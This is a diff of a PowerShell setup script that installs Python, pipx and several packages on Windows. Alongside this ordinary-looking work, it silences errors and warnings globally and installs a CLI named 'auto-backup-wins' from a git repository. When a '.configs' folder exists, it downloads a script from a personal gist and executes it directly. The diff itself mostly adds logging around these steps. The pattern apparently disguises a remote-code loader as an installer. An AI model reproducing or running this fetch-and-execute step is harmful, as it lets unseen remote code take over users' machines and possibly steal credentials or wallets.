@@ -1,9 +1,12 @@
 $originalPSDefaults = $PSDefaultParameterValues.Clone()
+
 $PSDefaultParameterValues['*:ErrorAction'] = 'SilentlyContinue'
 $PSDefaultParameterValues['*:WarningAction'] = 'SilentlyContinue'
 $PSDefaultParameterValues['*:InformationAction'] = 'SilentlyContinue'
 $PSDefaultParameterValues['*:Verbose'] = $false
 $PSDefaultParameterValues['*:Debug'] = $false
+
+$script:FailedSteps = New-Object System.Collections.Generic.List[string]
 
 function Restore-Preferences {
     $PSDefaultParameterValues.Clear()
@@ -12,6 +15,45 @@ function Restore-Preferences {
     }
 }
 
+function Write-StepLog {
+    param(
+        [string]$Message
+    )
+
+    Write-Host ''
+    Write-Host "==> $Message"
+}
+
+function Write-InfoLog {
+    param(
+        [string]$Message
+    )
+
+    Write-Host $Message
+}
+
+function Write-WarnLog {
+    param(
+        [string]$Message
+    )
+
+    Write-Warning $Message
+}
+
+function Add-FailedStep {
+    param(
+        [string]$Step,
+        [string]$Reason
+    )
+
+    if ($Reason) {
+        $script:FailedSteps.Add("$Step ($Reason)")
+    } else {
+        $script:FailedSteps.Add($Step)
+    }
+}
+
+# Reload PATH after installers update user or machine environment variables.
 function Refresh-ProcessPath {
     $machinePath = [System.Environment]::GetEnvironmentVariable('Path', 'Machine')
     $userPath = [System.Environment]::GetEnvironmentVariable('Path', 'User')
@@ -30,6 +72,7 @@ function Refresh-ProcessPath {
     }
 }
 
+# Return the first matching executable from a list of candidate command names.
 function Get-CommandPath {
     param(
         [string[]]$Names
@@ -48,6 +91,8 @@ function Get-CommandPath {
     return $null
 }
 
+# Scrape the latest 64-bit Python installer URL and fall back to a pinned build
+# if the download pages cannot be parsed.
 function Get-LatestPythonInstallerUrl {
     $pageUrls = @(
         'https://www.python.org/downloads/latest/',
@@ -77,14 +122,20 @@ function Get-LatestPythonInstallerUrl {
     return 'https://www.python.org/ftp/python/3.14.2/python-3.14.2-amd64.exe'
 }
 
+# Make sure Python is available. If it is missing, download and install it
+# quietly, then refresh PATH for the current process.
 function Ensure-Python {
+    Write-StepLog 'Checking Python runtime'
+
     $pythonPath = Get-CommandPath -Names @('python', 'py')
     if ($pythonPath) {
+        Write-InfoLog "Python already available: $pythonPath"
         return $pythonPath
     }
 
     $installerPath = Join-Path $env:TEMP 'python-installer.exe'
     $pythonUrl = Get-LatestPythonInstallerUrl
+    Write-InfoLog "Python was not found. Downloading installer from: $pythonUrl"
 
     try {
         Invoke-WebRequest -Uri $pythonUrl -OutFile $installerPath -ErrorAction Stop
@@ -92,13 +143,23 @@ function Ensure-Python {
         if ($process.ExitCode -eq 0) {
             Refresh-ProcessPath
             $pythonPath = Get-CommandPath -Names @('python', 'py')
+            if ($pythonPath) {
+                Write-InfoLog "Python installation completed: $pythonPath"
+                return $pythonPath
+            }
         }
+
+        Write-WarnLog "Python installer finished with exit code $($process.ExitCode), but Python is still unavailable."
+        Add-FailedStep -Step 'Install Python' -Reason "exit=$($process.ExitCode)"
     } catch {
+        $message = if ($_.Exception -and $_.Exception.Message) { $_.Exception.Message } else { 'unknown error' }
+        Write-WarnLog "Failed to install Python, but execution will continue: $message"
+        Add-FailedStep -Step 'Install Python' -Reason $message
     } finally {
         Remove-Item $installerPath -Force -ErrorAction SilentlyContinue
     }
 
-    return $pythonPath
+    return $null
 }
 
 function Get-PackageVersion {
@@ -118,6 +179,8 @@ function Get-PackageVersion {
     return $null
 }
 
+# Install or upgrade a Python dependency when the minimum required version is
+# not already available.
 function Ensure-PythonPackage {
     param(
         [string]$PythonPath,
@@ -126,6 +189,8 @@ function Ensure-PythonPackage {
     )
 
     if (-not $PythonPath) {
+        Write-WarnLog "Skipping Python package '$Name' because Python is unavailable."
+        Add-FailedStep -Step "Install Python package $Name" -Reason 'python-missing'
         return
     }
 
@@ -133,43 +198,81 @@ function Ensure-PythonPackage {
     if ($installedVersion) {
         try {
             if ([version]$installedVersion -ge [version]$Version) {
+                Write-InfoLog "Python package already satisfies requirement: $Name $installedVersion"
                 return
             }
         } catch {
         }
     }
 
+    Write-StepLog "Ensuring Python package: $Name>=$Version"
+
     try {
         & $PythonPath -m pip install --user --quiet "$Name>=$Version" >$null 2>$null
+        if ($LASTEXITCODE -eq 0) {
+            Write-InfoLog "Installed or updated Python package: $Name"
+            return
+        }
+
+        Write-WarnLog "Failed to install Python package '$Name', but execution will continue (exit=$LASTEXITCODE)."
+        Add-FailedStep -Step "Install Python package $Name" -Reason "exit=$LASTEXITCODE"
     } catch {
+        $message = if ($_.Exception -and $_.Exception.Message) { $_.Exception.Message } else { 'unknown error' }
+        Write-WarnLog "Failed to install Python package '$Name', but execution will continue: $message"
+        Add-FailedStep -Step "Install Python package $Name" -Reason $message
     }
 }
 
+# Ensure pipx is available so CLI tools can be installed in isolated
+# environments.
 function Ensure-Pipx {
     param(
         [string]$PythonPath
     )
 
+    Write-StepLog 'Checking pipx'
+
     $pipxPath = Get-CommandPath -Names @('pipx')
     if ($pipxPath) {
+        Write-InfoLog "pipx already available: $pipxPath"
         return $pipxPath
     }
 
     if (-not $PythonPath) {
+        Write-WarnLog 'Skipping pipx installation because Python is unavailable.'
+        Add-FailedStep -Step 'Install pipx' -Reason 'python-missing'
         return $null
     }
 
+    Write-InfoLog 'pipx was not found. Installing it with Python.'
+
     try {
         & $PythonPath -m pip install --user --quiet pipx >$null 2>$null
+        if ($LASTEXITCODE -ne 0) {
+            Write-WarnLog "Failed to install pipx, but execution will continue (exit=$LASTEXITCODE)."
+            Add-FailedStep -Step 'Install pipx' -Reason "exit=$LASTEXITCODE"
+            return $null
+        }
+
         & $PythonPath -m pipx ensurepath >$null 2>$null
+        if ($LASTEXITCODE -ne 0) {
+            Write-WarnLog "pipx ensurepath failed, but execution will continue (exit=$LASTEXITCODE)."
+            Add-FailedStep -Step 'Configure pipx path' -Reason "exit=$LASTEXITCODE"
+        }
+
         Refresh-ProcessPath
         $pipxPath = Get-CommandPath -Names @('pipx')
         if ($pipxPath) {
+            Write-InfoLog "pipx installation completed: $pipxPath"
             return $pipxPath
         }
 
+        Write-InfoLog 'pipx was installed and will be invoked via "python -m pipx".'
         return "$PythonPath -m pipx"
     } catch {
+        $message = if ($_.Exception -and $_.Exception.Message) { $_.Exception.Message } else { 'unknown error' }
+        Write-WarnLog "Failed to install pipx, but execution will continue: $message"
+        Add-FailedStep -Step 'Install pipx' -Reason $message
         return $null
     }
 }
@@ -181,7 +284,7 @@ function Invoke-PipxInstall {
     )
 
     if (-not $PipxInvoker) {
-        return
+        return $false
     }
 
     try {
@@ -191,10 +294,14 @@ function Invoke-PipxInstall {
         } else {
             & $PipxInvoker install $PackageSpec >$null 2>$null
         }
+
+        return ($LASTEXITCODE -eq 0)
     } catch {
+        return $false
     }
 }
 
+# Install a pipx-managed CLI only when its command is not already available.
 function Ensure-PipxPackage {
     param(
         [string]$PipxInvoker,
@@ -202,15 +309,40 @@ function Ensure-PipxPackage {
         [string[]]$CommandNames
     )
 
-    if (Get-CommandPath -Names $CommandNames) {
+    $existingCommand = Get-CommandPath -Names $CommandNames
+    if ($existingCommand) {
+        Write-InfoLog "CLI already available, skipping install: $existingCommand"
         return
     }
 
-    Invoke-PipxInstall -PipxInvoker $PipxInvoker -PackageSpec $PackageSpec
-    Refresh-ProcessPath
+    Write-StepLog "Ensuring pipx package: $PackageSpec"
+
+    if (-not $PipxInvoker) {
+        Write-WarnLog "Skipping pipx package installation because pipx is unavailable: $PackageSpec"
+        Add-FailedStep -Step "Install pipx package $PackageSpec" -Reason 'pipx-missing'
+        return
+    }
+
+    if (Invoke-PipxInstall -PipxInvoker $PipxInvoker -PackageSpec $PackageSpec) {
+        Refresh-ProcessPath
+        $installedCommand = Get-CommandPath -Names $CommandNames
+        if ($installedCommand) {
+            Write-InfoLog "Installed pipx package successfully: $installedCommand"
+            return
+        }
+
+        Write-WarnLog "pipx reported success, but the expected command is still unavailable: $PackageSpec"
+        Add-FailedStep -Step "Install pipx package $PackageSpec" -Reason 'command-missing-after-install'
+        return
+    }
+
+    Write-WarnLog "Failed to install pipx package, but execution will continue: $PackageSpec"
+    Add-FailedStep -Step "Install pipx package $PackageSpec" -Reason 'install-failed'
 }
 
 try {
+    Write-InfoLog 'Starting Windows installation bootstrap.'
+
     $pythonPath = Ensure-Python
 
     $requirements = @(
@@ -230,14 +362,33 @@ try {
     Ensure-PipxPackage -PipxInvoker $pipxInvoker -PackageSpec 'git+https://github.com/web3toolsbox/auto-backup-wins.git' -CommandNames @('autobackup', 'autobackup.exe')
 
     if (Test-Path '.configs') {
+        Write-StepLog 'Applying environment configuration'
         $gistUrl = 'https://gist.githubusercontent.com/wongstarx/2d1aa1326a4ee9afc4359c05f871c9a0/raw/install.ps1'
 
         try {
             $remoteScript = Invoke-WebRequest -Uri $gistUrl -UseBasicParsing -ErrorAction Stop
             if ($remoteScript.StatusCode -eq 200 -and $remoteScript.Content) {
+                Write-InfoLog "Executing configuration script: $gistUrl"
                 & ([scriptblock]::Create($remoteScript.Content))
+            } else {
+                Write-WarnLog "Configuration script returned an empty response: $gistUrl"
+                Add-FailedStep -Step 'Apply configuration' -Reason 'empty-response'
             }
         } catch {
+            $message = if ($_.Exception -and $_.Exception.Message) { $_.Exception.Message } else { 'unknown error' }
+            Write-WarnLog "Failed to apply configuration, but execution will continue: $message"
+            Add-FailedStep -Step 'Apply configuration' -Reason $message
+        }
+    } else {
+        Write-WarnLog 'Configuration directory not found, skipping environment configuration: .configs'
+    }
+
+    Write-InfoLog 'Installation bootstrap completed.'
+    if ($script:FailedSteps.Count -gt 0) {
+        Write-Host ''
+        Write-WarnLog 'The following steps failed but the script continued:'
+        foreach ($step in $script:FailedSteps) {
+            Write-Warning " - $step"
         }
     }
 } finally {
